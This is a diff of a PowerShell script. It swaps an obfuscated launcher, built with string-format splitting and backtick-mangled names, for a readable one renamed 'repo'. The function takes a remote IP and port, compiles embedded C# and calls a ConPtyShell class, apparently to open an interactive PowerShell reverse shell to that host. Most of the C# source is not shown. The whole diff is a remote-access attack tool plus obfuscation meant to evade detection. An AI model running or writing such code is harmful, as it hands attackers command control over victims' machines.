@@ -1,53 +1,53 @@
-${b0y1} =[tyPE]("{4}{0}{1}{2}{3}{5}" -f'o','nPt','YShElLMAIN','c','C','LaSs');  function R`ePO
+function repo
 {   
     Param
     (
-        [Parameter(PosITIOn = 0)]
-        [String]
-        ${rEm`oTE`IP},
-
-        [Parameter(poSITIon = 1)]
-        [String]
-        ${ReMOtE`pO`Rt},
-
         [Parameter()]
         [String]
-        ${r`oWS} = "24",
+        $CommandLine = "powershell.exe",
 
-        [Parameter()]
+        [Parameter(Position = 0)]
         [String]
-        ${C`OLS} = "80",
-
-        [Parameter()]
-        [String]
-        ${c`omMA`NDliNE} = ("{3}{1}{0}{2}"-f'ell','rsh','.exe','powe'),
+        $RemoteIp,
 
         [Parameter()]
         [Switch]
-        ${U`PG`RADE}
+        $Upgrade,
+
+        [Parameter()]
+        [String]
+        $Rows = "24",
+
+        [Parameter(Position = 1)]
+        [String]
+        $RemotePort,
+
+        [Parameter()]
+        [String]
+        $Cols = "80"
     )
 
-    if( ${Ps`B`oUN`Dpa`RAmEte`RS}.("{1}{0}{2}"-f'on','C','tainsKey').Invoke(("{0}{1}" -f'Upg','rade')) ) {
-        ${REmO`T`eiP} = ("{1}{0}" -f'grade','up')
-        ${rEmoTe`p`oRt} = ("{1}{0}" -f 'ell','sh')
+    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
+        $RemoteIp = "upgrade"
+        $RemotePort = "shell"
     }
     else{
 
-        if(-Not(${pSBoUND`PAr`Am`ET`ERs}.("{1}{3}{2}{0}"-f'y','Con','ainsKe','t').Invoke(("{0}{1}"-f 'Re','moteIp')))) {
-            throw ("{0}{4}{2}{3}{1}"-f 'Re','r','missing ','paramete','moteIp ')
+        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
+            throw "RemoteIp missing parameter"
         }
 
-        if(-Not(${P`sb`OunDParAMEt`ERs}.("{1}{0}{2}{3}" -f's','Contain','Ke','y').Invoke(("{1}{2}{0}"-f 'rt','RemoteP','o')))) {
-            throw ("{0}{4}{2}{1}{3}" -f'RemotePo','amete','issing par','r','rt m')
+        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
+            throw "RemotePort missing parameter"
         }
     }
-    ${P`AR`Am`ETErS`COn`Ptyshell} = @(${reMO`T`EIP}, ${rEM`o`TEporT}, ${ro`wS}, ${Co`ls}, ${CO`Mm`ANDLinE})
-    &("{2}{0}{1}" -f'-T','ype','Add') -TypeDefinition ${s`our`ce} -Language ("{1}{0}" -f 'p','CShar');
-    ${ou`T`pUt} =  (  &("{1}{0}{2}" -f 'Et','g','-cHiLDITem') ("{3}{1}{4}{0}{2}"-f'b0Y','AR','1','V','iABLE:')  )."va`LuE"::("{2}{3}{0}{1}" -f'M','ain','ConPt','yShell').Invoke(${PA`RAME`TeRs`COnP`T`ysh`Ell})
-    &("{3}{2}{1}{0}" -f't','pu','rite-Out','W') ${oUt`pUT}
+    Set-Variable -Name parametersConPtyShell -Value (@($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine))
+    Add-Type -TypeDefinition $Source -Language CSharp;
+    Set-Variable -Name output -Value ([ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell))
+    Write-Output $output
 }
 
-${So`U`Rce} = @"
+Set-Variable -Name Source -Value (@"
 
 using System;
 using System.IO;
@@ -1610,5 +1610,5 @@ class MainClass
     }
 }
 
-"@;
+"@);
 
